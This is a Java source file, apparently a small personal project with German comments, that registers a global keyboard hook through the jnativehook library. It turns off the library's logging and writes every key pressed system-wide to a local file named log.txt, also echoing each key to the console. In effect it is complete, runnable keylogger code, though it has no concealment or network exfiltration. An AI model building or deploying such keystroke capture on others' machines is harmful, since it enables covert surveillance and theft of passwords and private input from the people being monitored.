package main;
/**
 * @author Lear Sokoli
 */
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.FileWriter;
import java.io.IOException;


public class Main implements NativeKeyListener {
    private static FileWriter writer; /** 
    * Hier wird das Writer Objekt erzeugt.
    */
    
	public static void main(String[] args) {
		String text = "Input";
		
		
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {			
			e.printStackTrace();
		}
			GlobalScreen.addNativeKeyListener(new Main());
			// Get the logger for "org.jnativehook" and set the level to off.
			Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
			logger.setLevel(Level.OFF);
			/**
			 * Logger wird nicht die Maus Bewegung zeigen!!
			 * 
			 */
			// Don't forget to disable the parent handlers.
			logger.setUseParentHandlers(false);
			
			
			// FileWriter w;
				try {
					writer = new FileWriter("log.txt");
					/**
					 * im log.txt werden die Eingabe von tastatur gespeichert.
					 * log.txt befindet sich im Ordner des Projektes
					 */
					
				} catch (IOException e1) {
					System.out.println("Problem bei FileWriter"); /**
					*
					*@throws Zeigt dass, ein Problem mit dem FileWriter gibt.
					**/
				} 
			
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
	    String text = NativeKeyEvent.getKeyText(e.getKeyCode());
		System.out.println("Pressed: " + text );
		/**
		 * text wird die Eingabe gespeichert. Nur weil Text eine String datei sit, kann ich 
		 * das im Writer schreiben, write(); funktion
		 * @return Die Eingabe der Tastatur
		 */
		
		try {
			writer.write(text);
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		try {
			writer.flush();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		
	}
	
	

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		//System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		
	}

}
